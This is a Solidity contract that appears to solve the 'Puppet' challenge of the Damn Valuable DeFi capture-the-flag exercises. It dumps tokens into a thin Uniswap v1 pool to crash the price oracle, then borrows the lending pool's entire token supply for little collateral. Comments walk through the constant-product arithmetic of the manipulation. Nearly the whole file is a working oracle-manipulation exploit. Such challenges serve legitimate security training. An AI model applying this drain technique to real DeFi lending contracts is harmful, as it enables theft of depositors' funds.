//SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import "../../src/puppet/PuppetPool.sol";
import "../../src/puppet/IUniswapV1Exchange.sol";
import "../../src/puppet/IUniswapV1Factory.sol";
import "../../src/DamnValuableToken.sol";

contract ExploitPuppet{
    
    PuppetPool public puppetPool;
    DamnValuableToken public token;
    IUniswapV1Exchange public uniswapV1Exchange;
    IUniswapV1Factory public uniswapV1Factory;
    address public recovery;

    constructor(PuppetPool _puppetPool, DamnValuableToken _token, IUniswapV1Exchange _uniswapV1Exchange, address _recovery) payable{
        puppetPool = _puppetPool;
        token = _token;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;   //we send all the exploited funds to this address
    }

    // initially, pool has 100000 DVTs in liquidity.
    // Thereâ€™s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.
    // You start with 25 ETH and 1000 DVTs in balance.
   function drain(uint256 drainAmount) public {

        uint256 tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 9, block.timestamp, address(this)); //swap all DVTs for ETHs, we can get 9 ETHs for 10 DVTs because, pool initially has 10DVTs and 10ETHs in liquidity, so we can crash the pool with 1000DVTs
        // initial: pool 10DVT, 10ETH, x*y=k, k=100 | me: 1000DVTs
        // after swap: pool 1010DVT, yETH, k=100, y=100/1010=0.0990099, we were able to swap out 1000DVTs for 10-0.0990099=~9.9ETHs
        // now, pool has 1010DVTs and 0.099ETHs, the price of DVT according to the oracle calculation is: 0.099ETH/1010DVTs = 0.0000980198ETH/DVT,
        // we will be able to borrow the whole 100000DVTs with little collateral, 100000*0.0000980198*2=19.60396ETHs, we have 25+9.9=34.9ETHs, so we can borrow 100000DVTs, and completely draining the liquidity from puppet pool.
        
        puppetPool.borrow{value: address(this).balance}(drainAmount, recovery); //borrow 100000 DVTs and send them to the recovery address, passing in balance of this contract as collateral(msg.value)
   }

   receive() external payable {}
}

